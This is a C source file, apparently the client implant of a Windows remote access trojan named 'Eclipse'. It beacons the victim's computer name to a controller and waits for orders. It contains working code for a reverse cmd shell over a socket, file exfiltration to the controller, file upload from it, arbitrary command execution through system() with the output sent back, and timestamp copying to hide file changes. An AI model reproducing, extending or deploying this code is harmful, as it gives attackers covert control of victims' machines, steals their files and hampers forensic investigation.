#include"Eclipse.h"

SettingDataStruct settingDataStruct = {"!@#$%^_CONFIG_^%$#@!"};
ActionDataStruct actionData;
char cHostName[100];

SOCKET createConnect() {
	SOCKADDR_IN addr;
	int addlen = sizeof(addr);
	SOCKET sConnect;
	sConnect = socket(AF_INET, SOCK_STREAM, NULL);
	addr.sin_addr.s_addr = inet_addr(settingDataStruct.host);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(settingDataStruct.dwPort);
	connect(sConnect, (SOCKADDR*)&addr, sizeof(addr));
	return sConnect;
}

SOCKET createConnect(char *IP, DWORD dwPort) {
	SOCKADDR_IN addr;
	int addlen = sizeof(addr);
	SOCKET sConnect;
	sConnect = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);
	addr.sin_addr.s_addr = inet_addr(IP);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(dwPort);
	connect(sConnect, (SOCKADDR*)&addr, sizeof(addr));
	return sConnect;
}

DWORD WINAPI threadGetShell(LPVOID IP_PORT) {
	DWORD dwPort = 0;
	char cIP[100];
	memset(cIP, 0, 100);
	sscanf_s((char*)IP_PORT, "%s %d", cIP, 100, &dwPort, 100);
	SOCKET socketShell = createConnect(cIP, dwPort);
	GUID TransmitPacketsGuid;

	char buffer[30];
	DWORD size;

	WSAIoctl(socketShell, SIO_ADDRESS_LIST_QUERY, NULL, 0, NULL, 0, &size, NULL, NULL);

	PROCESS_INFORMATION piProcInfo;
	STARTUPINFOA siStartInfo;
	memset(&piProcInfo, 0, sizeof(PROCESS_INFORMATION));
	memset(&siStartInfo, 0, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = (HANDLE)socketShell;
	siStartInfo.hStdOutput = (HANDLE)socketShell;
	siStartInfo.hStdInput = (HANDLE)socketShell;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	char cmd[] = "cmd";
	CreateProcessA(NULL, // Use szCmdLine
		cmd,     // command line
		NULL,          // process security attributes
		NULL,          // primary thread security attributes
		TRUE,          // handles are inherited
		0,             // creation flags
		NULL,          // use parent's environment
		NULL,          // use parent's current directory
		&siStartInfo,  // STARTUPINFO pointer
		&piProcInfo);  // receives PROCESS_INFORMATION
	return 0;
}

DWORD WINAPI createDownload(LPVOID lpParam) {
	char cFileName[260];
	memset(cFileName, 0, 260);
	strcpy_s(cFileName, (char*)lpParam);

	HANDLE hFile = CreateFileA(cFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
		return 0;
	}
	DWORD dwFileSize = GetFileSize(hFile, 0);
	char* buf = (char*)malloc(dwFileSize);
	DWORD dwToRead = dwFileSize, dwReaded = 0;
	char* ptr = buf;
	do {
		ReadFile(hFile, ptr, dwToRead, &dwReaded, 0);
		dwToRead -= dwReaded;
		ptr += dwReaded;
	} while (dwToRead > 0);
	CloseHandle(hFile);

	char cFileSize[50];
	memset(cFileSize, 0, 50);
	sprintf_s(cFileSize, "%d", dwFileSize);

	SOCKET socket = createConnect();
	ActionDataStruct requestActionData;
	memset(&requestActionData, 0, sizeof(ActionDataStruct));
	strcpy_s(requestActionData.cAction, "Download");
	strcpy_s(requestActionData.cMessage, cHostName);
	sendData(socket, (char*) &requestActionData, sizeof(ActionDataStruct));

	memset(&requestActionData, 0, sizeof(ActionDataStruct));
	char* cfilename = cFileName;
	for (int n = 0; cFileName[n] != 0; n++) {
		if (cFileName[n] == '\\')
			cfilename = &cFileName[n + 1];
	}
	strcpy_s(requestActionData.cAction, cfilename);
	strcpy_s(requestActionData.cMessage, cFileSize);
	sendData(socket, (char*)&requestActionData, sizeof(ActionDataStruct));
	
	recvData(socket, (char*)&requestActionData, sizeof(ActionDataStruct));
	if (strcmp(requestActionData.cAction, "Ready") != 0)return 0;

	DWORD dwToSend = dwFileSize, dwSended = 0;
	ptr = buf;
	do {
		dwSended = sendData(socket, ptr, dwToSend);
		dwToSend -= dwSended;
		ptr += dwSended;
	} while (dwToSend > 0);
	closesocket(socket);
	free(buf);
	return 0;
}

DWORD WINAPI createUpload(LPVOID lpParam) {
	char cFileName[300];
	DWORD dwFileSize;
	memset(cFileName, 0, 300);
	
	SOCKET socket = createConnect();
	ActionDataStruct requestActionData;
	memset(&requestActionData, 0, sizeof(ActionDataStruct));
	strcpy_s(requestActionData.cAction, "Upload");
	strcpy_s(requestActionData.cMessage, cHostName);
	sendData(socket, (char*)&requestActionData, sizeof(ActionDataStruct));
	recvData(socket, (char*)&requestActionData, sizeof(ActionDataStruct));
	strcpy_s(cFileName, requestActionData.cAction);
	sscanf_s(requestActionData.cMessage, "%d", &dwFileSize);

	char* buf = (char*)malloc(dwFileSize);
	DWORD dwToRecv = dwFileSize, dwRecved = 0;
	char* ptr = buf;
	do {
		dwRecved = recvData(socket, ptr, dwToRecv);
		dwToRecv -= dwRecved;
		ptr += dwRecved;
	} while (dwToRecv > 0);
	//printf("%s", cFileName);
	HANDLE hFile = CreateFileA(cFileName, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		//printf("Open File Error.\n");
		CloseHandle(hFile);
		return 0;
	}

	dwToRecv = dwFileSize, dwRecved = 0;
	do {
		WriteFile(hFile, buf, dwToRecv, &dwRecved, 0);
		dwToRecv -= dwRecved;
		ptr += dwRecved;
	} while (dwToRecv > 0);
	CloseHandle(hFile);
	closesocket(socket);
	free(buf);
	return 0;
}

int ExecuteCmd(SOCKET socket) {
	char buf[0x1000], tempFile[200];
	memset(tempFile, 0, 200);
	GetTempPathA(200, tempFile);
	strcat_s(tempFile, "\\tmp.log");
	memset(buf, 0, 0x1000);
	recvData(socket, buf, 0x1000);
	sprintf_s(buf, "%s>%s", buf, tempFile);
	system(buf);
	char cFileSize[0x10];
	DWORD dwFileSize, dwReaded;
	memset(cFileSize, 0, 0x10);
	HANDLE hFile = CreateFileA(tempFile, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	dwFileSize = GetFileSize(hFile, 0);
	if (hFile == INVALID_HANDLE_VALUE) {
		char msg[] = "Command Error.\n";
		dwFileSize = strlen(msg);
		sprintf_s(cFileSize, "%d", dwFileSize);
		sendData(socket, cFileSize, 0x10);
		sendData(socket, msg, dwFileSize);
	}
	else if (dwFileSize == 0) {
		sprintf_s(cFileSize, "%d", 1);
		sendData(socket, cFileSize, 0x10);
		sendData(socket, (char*)"\n", 1);
	}
	else {
		sprintf_s(cFileSize, "%d", dwFileSize);
		sendData(socket, cFileSize, 0x10);
		char* ptr = (char*)malloc(dwFileSize);
		memset(ptr, 0, dwFileSize);
		ReadFile(hFile, ptr, dwFileSize, &dwReaded, 0);
		sendData(socket, ptr, dwFileSize);
		free(ptr);
	}
	CloseHandle(hFile);
	DeleteFileA(tempFile);
	return 0;
}

int ChangeFileTime(SOCKET socket) {
	char dst[0x100], src[0x100], response[0x100];
	memset(dst, 0, 0x100);
	memset(src, 0, 0x100);
	memset(response, 0, 0x100);
	recvData(socket, dst, 0x100);
	recvData(socket, src, 0x100);

	HANDLE hFile1, hFile2;
	FILETIME ftCreate, ftAccess, ftWrite;
	SYSTEMTIME stUTC, stLocal;
	hFile1 = CreateFileA(src, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	hFile2 = CreateFileA(dst, GENERIC_ALL, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile1 == INVALID_HANDLE_VALUE) 
		strcpy_s(response, "[-] No Src File");
	else if (hFile2 == INVALID_HANDLE_VALUE) 
		strcpy_s(response, "[-] No Dst File");
	else if (!GetFileTime(hFile1, &ftCreate, &ftAccess, &ftWrite)) 
		strcpy_s(response, "[-] Src GetFileTime Error!");
	else if (!SetFileTime(hFile2, &ftCreate, &ftAccess, &ftWrite)) 
		strcpy_s(response, "[-] Dst SetFileTime Error!");
	else
		strcpy_s(response, "[+] CFT Success.");
	CloseHandle(hFile1);
	CloseHandle(hFile2);
	sendData(socket, response, 0x100);
	return 0;
}

DWORD WINAPI createControl(LPVOID lpParam) {
	SOCKET socket = createConnect();
	ActionDataStruct requestActionData, responseActionData;
	memset((char*)&requestActionData, 0, sizeof(ActionDataStruct));
	strcpy_s(requestActionData.cAction, sizeof(requestActionData.cAction), "Connect");
	strcpy_s(requestActionData.cMessage, actionData.cMessage);
	int ret = sendData(socket, (char*)&requestActionData, sizeof(ActionDataStruct));
	// printf("=> %s %s %d\n", requestActionData.cAction, requestActionData.cMessage, ret);
	DWORD recvSize = 0, dwFlag = 1;
	while (dwFlag) {
		memset((char*)&responseActionData, 0, sizeof(ActionDataStruct));
		recvSize = recvData(socket, (char*)&responseActionData, sizeof(ActionDataStruct));
		if (recvSize <= 0) dwFlag = 0;
		if (strcmp(responseActionData.cAction, "Shell") == 0) {
			CreateThread(NULL, 0, threadGetShell, responseActionData.cMessage, 0, NULL);
		}else if (strcmp(responseActionData.cAction, "Download") == 0) {
			CreateThread(NULL, 0, createDownload, responseActionData.cMessage, 0, NULL);
		}else if (strcmp(responseActionData.cAction, "Upload") == 0) {
			CreateThread(NULL, 0, createUpload, responseActionData.cMessage, 0, NULL);
		}else if (strcmp(responseActionData.cAction, "Cmd") == 0) {
			ExecuteCmd(socket);
		}else if (strcmp(responseActionData.cAction, "CFT") == 0) {
			ChangeFileTime(socket);
		}
		Sleep(500);
	}
	closesocket(socket);
	return 0;
}

int main(int argc, char **argv) {
	/*
	//strcpy_s(settingDataStruct.host, 100, "127.0.0.1");
	strcpy_s(settingDataStruct.host, 100, "192.168.100.10");
	settingDataStruct.dwPort = 8888;
	settingDataStruct.dwSleepTime = 5;
	/**/

	DWORD dwHostNameSize = 100;
	GetComputerNameA(cHostName, &dwHostNameSize);

	memset((char*)&actionData, 0, sizeof(ActionDataStruct));
	strcpy_s(actionData.cAction, "Knock");
	strcpy_s(actionData.cMessage, cHostName);

	int r;
	ActionDataStruct recvActionData;
	WSAData wsaData;
	WORD DLLVersion;
	DLLVersion = MAKEWORD(2, 2);
	r = WSAStartup(DLLVersion, &wsaData);
	while (1) {
		SOCKET socket = createConnect();
		int ret = sendData(socket, (char*) & actionData, sizeof(ActionDataStruct));
		if (ret <= 0) {
			Sleep(settingDataStruct.dwSleepTime * 1000);
			continue;
		}
		memset(&recvActionData, 0, sizeof(ActionDataStruct));
		ret = recvData(socket, (char*)&recvActionData, sizeof(ActionDataStruct));
		if (ret <= 0) {
			Sleep(settingDataStruct.dwSleepTime * 1000);
			continue;
		}
		
		//printf("%s\n", recvActionData.cAction);
		if (strcmp(recvActionData.cAction, "Hello") == 0) {

		}else if (strcmp(recvActionData.cAction, "Back") == 0) {
			CreateThread(NULL, 0, createControl, 0, 0, NULL);
		}
		Sleep(10 * 1000);
		closesocket(socket);
	}
    
	return 0;
}